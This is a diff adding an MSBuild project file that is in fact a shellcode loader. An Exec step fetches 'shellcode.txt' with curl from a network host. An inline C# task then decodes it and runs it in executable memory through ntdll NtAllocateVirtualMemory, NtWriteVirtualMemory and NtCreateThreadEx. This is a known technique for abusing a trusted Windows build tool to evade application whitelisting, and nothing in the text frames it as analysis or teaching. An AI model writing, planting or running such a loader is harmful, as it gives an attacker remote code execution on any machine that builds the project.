@@ -1,0 +1,37 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="X">
+    <Exec Command="curl -s http://192.168.1.179:9000/shellcode.txt -o %TEMP%\s.txt"/>
+    <X/>
+  </Target>
+  <UsingTask TaskName="X" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Reference Include="System.Management.Automation"/>
+      <Code Type="Class" Language="cs"><![CDATA[
+using System;
+using System.IO;
+using System.Net;
+using System.Runtime.InteropServices;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+public class X : Task {
+    [DllImport("ntdll")] static extern uint NtAllocateVirtualMemory(IntPtr h, ref IntPtr a, IntPtr z, ref uint s, uint t, uint p);
+    [DllImport("ntdll")] static extern uint NtWriteVirtualMemory(IntPtr h, IntPtr a, byte[] b, uint l, ref uint w);
+    [DllImport("ntdll")] static extern uint NtCreateThreadEx(out IntPtr t, uint d, IntPtr o, IntPtr h, IntPtr s, IntPtr p, bool c, uint z, uint st, uint ms, IntPtr a);
+    public override bool Execute() {
+        string p = Environment.GetEnvironmentVariable("TEMP") + "\\s.txt";
+        byte[] sc = Convert.FromBase64String(File.ReadAllText(p));
+        IntPtr h = (IntPtr)(-1);
+        IntPtr a = IntPtr.Zero;
+        uint sz = (uint)sc.Length;
+        NtAllocateVirtualMemory(h, ref a, IntPtr.Zero, ref sz, 0x3000, 0x40);
+        uint w = 0;
+        NtWriteVirtualMemory(h, a, sc, (uint)sc.Length, ref w);
+        IntPtr t;
+        NtCreateThreadEx(out t, 0x1FFFFF, IntPtr.Zero, h, a, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+        return true;
+    }
+}
+      ]]></Code>
+    </Task>
+  </UsingTask>
+</Project>
